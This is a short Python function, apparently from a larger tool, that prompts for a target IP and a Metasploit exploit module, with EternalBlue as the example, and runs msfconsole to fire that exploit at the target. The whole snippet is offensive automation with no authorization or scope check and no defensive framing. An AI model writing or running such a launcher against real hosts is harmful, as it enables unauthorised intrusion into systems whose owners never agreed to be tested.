import subprocess

def run_metasploit(sys_info):
    print("Running Metasploit...")
    target_ip = input("Please enter the target IP: ")
    exploit = input("Please enter the exploit you want to use (e.g., 'exploit/windows/smb/ms17_010_eternalblue'): ")

    metasploit_command = [
        'msfconsole', '-q', '-x', 
        f'use {exploit}; set RHOSTS {target_ip}; run; exit'
    ]

    subprocess.run(metasploit_command)
    print(f"Exploit {exploit} executed against {target_ip}.")
        